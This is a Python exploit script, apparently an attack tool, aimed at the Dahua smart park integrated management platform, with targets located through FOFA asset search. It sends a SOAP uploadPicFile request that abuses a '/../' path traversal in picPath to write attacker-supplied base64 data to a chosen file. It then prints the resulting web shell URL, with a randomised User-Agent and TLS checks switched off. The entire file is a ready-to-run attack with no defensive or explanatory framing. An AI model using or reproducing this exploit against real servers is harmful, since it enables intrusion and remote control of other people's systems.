import requests
from fake_useragent import UserAgent
print('------------------------------------------------------------------------------------------------------------------------------------------')
print('FOFA资产收集(app="dahua-智慧园区综合管理平台")')

server_address = input("请输入服务器地址：")
port = input("请输入端口：")
url = f'https://{server_address}:{port}/emap/webservice/gis/soap/bitmap'
user_agent = UserAgent()
random_user_agent = user_agent.random
headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'User-Agent': random_user_agent
}
base64_data = input("请输入加密信息：")
wenjianming_1=input("请输入文件名:")
data = f'''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <res:uploadPicFile>
            <arg0>
                <picPath>/../{wenjianming_1}</picPath>
            </arg0>
            <arg1>{base64_data}</arg1>
        </res:uploadPicFile>
    </soapenv:Body>
</soapenv:Envelope>
'''
response = requests.post(url, headers=headers, data=data, verify=False)
print('------------------------------------------------------------------------------------------------------------------------------------------')
print("随机生成的用户代理头部信息:", random_user_agent)
print('------------------------------------------------------------------------------------------------------------------------------------------')
url = f'https://{server_address}:{port}/upload/{wenjianming_1}'
print(response.text)
print('------------------------------------------------------------------------------------------------------------------------------------------')
print(f'最后的shell地址为:{url}')